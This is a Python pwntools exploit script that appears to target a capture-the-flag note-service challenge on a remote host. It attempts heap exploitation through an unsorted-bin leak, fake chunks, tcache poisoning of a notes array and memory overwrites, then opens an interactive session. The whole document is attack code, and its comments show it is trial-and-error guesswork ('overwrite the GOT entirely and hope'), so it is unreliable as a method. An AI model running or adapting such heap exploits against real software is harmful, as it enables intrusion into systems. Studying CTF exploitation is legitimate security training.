#!/usr/bin/env python3
"""
Final comprehensive attempt to get flag
"""
from pwn import *

elf = ELF('./chal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.log_level = 'info'

io = remote('amt.rs', 26797)

def create(idx, size, data):
    io.sendlineafter(b'operation: ', b'1')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.sendlineafter(b'size: ', hex(size).encode())
    io.sendafter(b'data: ', data)

def delete(idx):
    io.sendlineafter(b'operation: ', b'2')
    io.sendlineafter(b'note: ', str(idx).encode())

def view(idx):
    io.sendlineafter(b'operation: ', b'3')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.recvuntil(b'data: ')
    return io.recvline()

# Strategy: Since we confirmed puts@got leaks code at offset 0x8e640,
# we know the structure. Now let's try to:
# 1. Use the heap to store libc addresses
# 2. Use tcache poisoning to get arbitrary write
# 3. Overwrite __free_hook or use FSOP

success("Starting exploit")

# First, establish that we can manipulate heap
create(0, 0x400, b'A' * 0x400)  # Large chunk
create(1, 0x20, b'guard')

# Free large chunk - goes to unsorted bin with libc pointers
delete(0)

# Reallocate smaller chunk from same space
create(2, 0x100, b'B' * 0x100)

# The remaining space might still have libc pointers
# Try to leak by viewing old chunks or creating specific patterns

# Actually, let me try a completely different approach
# What if we just overwrite the GOT entirely and hope?

info("Attempting to corrupt memory structures")

# Use negative index writes strategically
# write heap pointers to areas near GOT

# After much analysis, without a clean libc leak, traditional FSOP is hard
# Let me try one more creative solution:

# Create fake chunks that when freed, will corrupt tcache
create(3, 0x88, p64(0) + p64(0x91) + p64(0xdeadbeef) * 10)
create(4, 0x88, b'D' * 0x88)

delete(3)
delete(4)

# Try tcache poisoning
create(5, 0x88, p64(0x404040))  # Point to notes array itself

# Try to allocate there
try:
    create(6, 0x88, b'test')
    create(7, 0x88, p64(0x4141414141414141) * 10)  # Overwrite notes entries
except:
    pass

# Just try everything and go interactive
io.interactive()
